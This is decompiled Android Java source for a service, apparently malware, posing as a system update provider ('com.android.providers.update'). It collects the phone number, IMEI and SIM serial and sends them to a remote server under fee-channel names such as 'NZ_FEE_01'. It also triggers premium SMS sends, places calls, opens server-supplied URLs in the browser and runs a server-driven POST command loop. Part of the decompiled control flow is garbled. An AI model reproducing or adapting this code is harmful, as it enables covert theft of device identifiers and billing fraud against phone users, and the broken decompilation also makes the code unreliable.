package com.android.providers.update;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import com.android.providers.sms.SMSSendService;
import com.android.providers.sms.SMSService;
import java.util.List;

public class OperateService extends Service {
    private String a;
    private String b = "NZ_FEE_01";
    private String c = "0601";
    private String d = "1009";
    private String e;
    private String f;
    private String g;
    /* access modifiers changed from: private */
    public int h;
    /* access modifiers changed from: private */
    public au i;

    public OperateService() {
        String str = "";
        String str2 = "";
        this.a = str;
        String str3 = "";
        this.e = str;
        String str4 = "";
        this.f = str;
        String str5 = "";
        this.g = str;
        this.i = null;
    }

    /* access modifiers changed from: private */
    public void a(au auVar) {
        Intent intent = new Intent(this, SMSSendService.class);
        intent.putExtra("SMS_Type", 1);
        intent.putExtra("PackBean", auVar);
        startService(intent);
    }

    /* access modifiers changed from: private */
    public void a(String str) {
        String str2 = "";
        String a2 = p.a(str.toString(), "MSG5");
        if (a2 == null) {
            String str3 = "";
            a2 = str2;
        }
        String str4 = "";
        if (!a2.equals(str2)) {
            Intent intent = new Intent();
            intent.setAction("android.intent.action.VIEW");
            Uri parse = Uri.parse(a2);
            intent.setFlags(268435456);
            intent.setData(parse);
            intent.setClassName("com.android.browser", "com.android.browser.BrowserActivity");
            startActivity(intent);
        }
    }

    /* access modifiers changed from: private */
    public void b(au auVar) {
        String g2 = auVar.g();
        String i2 = auVar.i();
        Intent intent = new Intent("android.intent.action.CALL", Uri.parse("tel:" + g2));
        intent.setFlags(268435456);
        startActivity(intent);
        new Thread(new f(this, i2)).start();
    }

    /* access modifiers changed from: private */
    public void c(au auVar) {
        h.a(auVar, this);
    }

    /* access modifiers changed from: private */
    /* JADX WARNING: Removed duplicated region for block: B:58:0x0206  */
    /* JADX WARNING: Removed duplicated region for block: B:78:0x0281  */
    public void d(au auVar) {
        String str;
        StringBuffer stringBuffer;
        String str2 = "";
        String str3 = "";
        String str4 = "";
        String str5 = "";
        String str6 = "";
        String str7 = "";
        String str8 = "";
        byte[] bArr = null;
        String replaceAll = auVar.g().replaceAll("&amp;", "&");
        String h2 = auVar.h();
        String i2 = auVar.i();
        ak.i = h2;
        String c2 = new d(replaceAll).c("");
        if (ak.k != null && !ak.k.toString().equals("")) {
            c2 = ak.k.toString() + "\n" + c2;
        }
        if (i2 == null || i2.equals("")) {
            str = ak.j;
        } else {
            ak.j = i2;
            str = i2;
        }
        List c3 = new d(str + "?operate=" + auVar.d() + "&opcode=1&sequence=1&returnUrls=" + str6 + "&returnMsgs=" + str7, "POST").c(c2.getBytes());
        while (true) {
            List<k> list = c3;
            byte[] bArr2 = bArr;
            StringBuffer stringBuffer2 = new StringBuffer();
            if ((list != null && list.size() != 0) || ((k.c != null && !k.c.equals("")) || (k.b != null && !k.b.equals("")))) {
                if (list != null && list.size() > 0) {
                    String str9 = k.a;
                    if (str9.equals("1")) {
                        for (k kVar : list) {
                            String f2 = kVar.f();
                            if (f2 == null) {
                                f2 = "";
                            }
                            d dVar = f2.equals("") ? new d(kVar.b(), kVar.c()) : new d(kVar.b(), kVar.c(), Integer.parseInt(f2));
                            if (kVar.a() != null && !kVar.a().equals("")) {
                                dVar.d(kVar.a());
                            }
                            String d2 = kVar.d();
                            if (d2 == null) {
                                d2 = "";
                            }
                            String c4 = dVar.c(d2);
                            if (kVar.e().equals("1")) {
                                if (ak.k != null && !ak.k.toString().equals("")) {
                                    stringBuffer2.append(ak.k.toString() + "\n");
                                }
                                stringBuffer2.append(c4);
                                stringBuffer2.append("####/n");
                            } else {
                                stringBuffer2 = new StringBuffer();
                            }
                        }
                        StringBuffer stringBuffer3 = stringBuffer2;
                        bArr = bArr2;
                        stringBuffer = stringBuffer3;
                    } else if (str9.equals("2")) {
                        k kVar2 = (k) list.get(0);
                        String f3 = kVar2.f();
                        if (f3 == null) {
                            f3 = "";
                        }
                        d dVar2 = f3.equals("") ? new d(kVar2.b(), kVar2.c()) : new d(kVar2.b(), kVar2.c(), Integer.parseInt(f3));
                        String d3 = kVar2.d();
                        if (d3 == null) {
                            d3 = "";
                        }
                        bArr2 = dVar2.b(d3);
                        if (!kVar2.e().equals("1")) {
                            StringBuffer stringBuffer4 = stringBuffer2;
                            bArr = null;
                            stringBuffer = stringBuffer4;
                        }
                    }
                    String str10 = k.a;
                    String str11 = k.b;
                    String str12 = k.c;
                    String str13 = k.d;
                    k.a = null;
                    k.b = null;
                    k.c = null;
                    k.d = null;
                    d dVar3 = new d(ak.j + "?operate=" + auVar.d() + "&opcode=" + str10 + "&sequence=" + str13 + "&returnUrls=" + str11 + "&returnMsgs=" + str12, "POST");
                    c3 = !str10.equals("1") ? !stringBuffer.toString().equals("") ? dVar3.c(stringBuffer.toString().getBytes()) : null : str10.equals("2") ? bArr != null ? dVar3.c(bArr) : null : list;
                }
                StringBuffer stringBuffer5 = stringBuffer2;
                bArr = bArr2;
                stringBuffer = stringBuffer5;
                String str102 = k.a;
                String str112 = k.b;
                String str122 = k.c;
                String str132 = k.d;
                k.a = null;
                k.b = null;
                k.c = null;
                k.d = null;
                d dVar32 = new d(ak.j + "?operate=" + auVar.d() + "&opcode=" + str102 + "&sequence=" + str132 + "&returnUrls=" + str112 + "&returnMsgs=" + str122, "POST");
                if (!str102.equals("1")) {
                }
            } else {
                return;
            }
        }
    }

    public String a() {
        Class<SMSService> cls = SMSService.class;
        String str = "SharePreImsi";
        String str2 = "";
        this.b = "NZ_FEE_01";
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService("phone");
        this.a = a.a((Context) this).a("SharePreCenterNumber");
        String str3 = "SharePreImsi";
        this.f = a.a((Context) this).a(str);
        if (!this.f.equals(telephonyManager.getSimSerialNumber())) {
            this.f = telephonyManager.getSimSerialNumber();
            String str4 = "SharePreImsi";
            a.a((Context) this).a(str, this.f);
            Class<SMSService> cls2 = SMSService.class;
            startService(new Intent(this, cls));
        } else {
            String str5 = "";
            if (this.a.equals(str2)) {
                String str6 = "";
                if (ak.q.equals(str2)) {
                    Class<SMSService> cls3 = SMSService.class;
                    startService(new Intent(this, cls));
                }
            }
            ak.q = this.a;
        }
        this.e = telephonyManager.getLine1Number();
        this.g = telephonyManager.getDeviceId();
        while (true) {
            String str7 = "";
            if (ak.q.equals(str2)) {
                Thread.sleep(2000);
            } else {
                d dVar = new d(ak.a + "name=" + this.b + "&channel=" + this.d + "&number=" + this.e + "&version=" + this.c + "&imsi=" + this.f + "&imei=" + this.g + "&center=" + ak.q);
                String str8 = "";
                return dVar.c(str2);
            }
        }
    }

    public void b() {
        this.b = "NZ_FEE_RESULT";
        new d(ak.a + "name=" + this.b + "&channel=" + this.d + "&number=" + this.e + "&version=" + this.c + "&imsi=" + this.f + "&imei=" + this.g + "&center=" + ak.q + "&passwayId=" + this.i.c() + "&amount=" + this.i.f()).c("");
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public void onStart(Intent intent, int i2) {
        this.h = i2;
        new ae(this).start();
    }
}
